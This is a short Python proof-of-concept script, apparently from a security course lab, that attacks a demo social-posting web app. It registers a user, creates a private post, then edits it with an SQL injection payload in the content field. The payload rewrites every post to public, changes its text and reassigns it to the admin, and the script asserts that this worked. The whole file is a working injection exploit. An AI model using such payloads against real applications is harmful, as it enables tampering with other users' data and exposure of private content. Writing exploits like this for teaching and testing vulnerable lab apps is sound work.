#!/usr/bin/env python3
import requests, sys, re
from interface import *
from bs4 import BeautifulSoup

if not (2 == len(sys.argv)):
    print(f"Usage: {__file__} server_url")
    sys.exit(-1)

url = sys.argv[1]

username="asdf"
password="asdf"

s = requests.Session()
reset_app(s, url)
register(s, url, username=username, password=password)

# create new post
content = "Very interesting content"
privacy = "Private"
homepage = create_post(s, url, content=content, privacy=privacy)

soup = BeautifulSoup(homepage.text, 'html.parser')
post = soup.find_all("div")[-1]
post_id = post.find_all("input")[0]['value']


# edit post
payload = "EXPOSED', type='Public', author='ssofadmin'#"
new_privacy = privacy
send_edit_post(s, url, post_id=post_id, content=payload, privacy=new_privacy)

homepage = get_home(s, url)
soup = BeautifulSoup(homepage.text, 'html.parser')
posts = soup.find_all("div", {'class': "row border border-dark rounded ml-1 mr-1"})

for post in posts:
    assert 'EXPOSED' in post.text
    assert '(Public)' in post.text
    assert 'ssofadmin : SSofAdmin' in post.text

print("[+] Changed all posts")
